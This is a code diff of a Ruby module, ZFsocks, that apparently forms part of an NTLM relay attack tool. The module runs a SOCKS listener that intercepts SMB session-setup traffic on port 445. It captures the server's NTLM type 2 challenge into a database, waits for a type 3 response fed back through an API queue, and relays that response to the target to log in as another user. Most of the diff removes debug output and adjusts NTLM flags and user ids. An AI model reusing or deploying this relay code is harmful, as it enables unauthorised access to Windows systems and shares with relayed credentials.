@@ -13,8 +13,8 @@ module ZFsocks
       begin
         @servers = TCPServer.open(ipaddr, port)
         return @servers
-      rescue Errno::EADDRINUSE, Errno::EACCESS
-        puts "SOCKS PORT IN USE OR PERMS"
+      rescue Errno::EADDRINUSE, Errno::EACCES
+        puts "SOCKS - PORT IN USE OR PERMS"
       return false
       end
     end
@@ -60,12 +60,8 @@ module ZFsocks
               puts "oh god, ssl proxy here we go"
 
             elsif port.to_i==445 then
-
-              puts "smbs"
               begin
                 TCPSocket.open(ip,445) do |relay|
-                  puts "OK!"
-
                   Consuccess(cli)
                   type2 = nil
                   threada= Thread.start {
@@ -73,46 +69,47 @@ module ZFsocks
                       begin
                         q, x = cli.recvfrom(5000)
                         if q.length == 0 then break end
-                        puts "server in"
                         req = ZFsmb::Client.new(q)
                         req.smbpid = "\xfe\xde"
                         if (req.smbcmd == "\x73") then # SetupAndX / SPNEGO TIME!
-                          puts "setupandx"
+                          #puts "setupandx"
+                           
                           ntlmreq = ZFsmb::Parsentlmfromspnego(req.bdata)
                           ntlmmsg = ZFNtlm::Message.new(ntlmreq)
 
                           if ntlmmsg.type == 1 then # if type 1 send type2
                             # TODO pull type1 from db (and well...store type1s)
-                            type1msgtemp = "\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x07\x82\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-                            puts "REPEAT CUSTOMER!"
+                            oldtype1msgtemp = "\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x07\x82\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+                            type1msgtemp =    "\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x01\x02\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                             ZFsmb::Smbclientntlmnego(relay, 1, type1msgtemp, "\x00\x00")
 
                           elsif ntlmmsg.type == 3 then #if type 3 send OK
+                            #puts q[32..33].unpack("H*")
                             ntlmmsg.parsetype3
 
-                            puts "SMB user: " + ntlmmsg.domain + "\\" + ntlmmsg.username
-                            puts "Passing type3"
-                            puts "gogothread"
+                            #puts "SMB user: " + ntlmmsg.domain + "\\" + ntlmmsg.username
+                            #puts "Passing type3"
 
                             reqid = zfdb.AddApiReq(ntlmmsg.username,ntlmmsg.domain,type2)
-                            puts "going to wait"
+                            #puts "going to wait"
                             begin
                             type3msg = zfdb.WaitForApiResp(reqid,15)[0]
-                            puts type3msg.inspect
+                            #puts type3msg.inspect
                             rescue
                               puts $!
                             end
-                            type3msg = Base64.decode64(type3msg).gsub("\n",'')
-                            puts "wait's over"
-                            ZFsmb::Smbclientntlmnego(relay, 3, type3msg, "\x00\x08")
+                            type3msg = Base64.decode64(type3msg) #removed gsub TODO fix gsub\n
+                            #puts "wait's over"
+                            ZFsmb::Smbclientntlmnego(relay, 3, type3msg, q[32..33])
+                            # TODO: Fix above to dynamic userid
                           else
                           relay.write(req.getpacket)
                           end
                         elsif (req.smbcmd == "\x75") then # TreeConnectAndX
 
-                          puts "treeconnectandx"
+                          #puts "treeconnectandx"
                           #TODO: update path!
-                          puts q[/(\x5c\x00\x5c\x00.*\x00\x00)/] # lazy detection of file share
+                          #puts q[/(\x5c\x00\x5c\x00.*\x00\x00)/] # lazy detection of file share
                         relay.write(req.getpacket)
                         else
                           q[30..31] = "\xfe\xde"
@@ -133,11 +130,12 @@ module ZFsocks
                       req2 = ZFsmb::Client.new(q2)
                       if (req2.smbcmd == "\x73") then # SetupAndX / SPNEGO TIME!
                         ntlmreq = ZFsmb::Parsentlmfromspnego(req2.bdata)
+
                         ntlmmsg = ZFNtlm::Message.new(ntlmreq)
                         if ntlmmsg.type == 2 then
-                          type2 = Base64.encode64(ntlmreq).gsub("\n",'').strip
+                          type2 = Base64.encode64(ntlmreq) #TODO fix gsub issue. temp removed
                         end
-                        puts "relay in"
+                        #puts "relay in"
                       cli.write(q2)
                       else
                       cli.write(q2)
@@ -145,7 +143,7 @@ module ZFsocks
                     rescue
                       puts "woof"
                       puts $!
-                      puts "rescue"
+                      #puts "rescue"
                     threada.kill
                     break
                     end
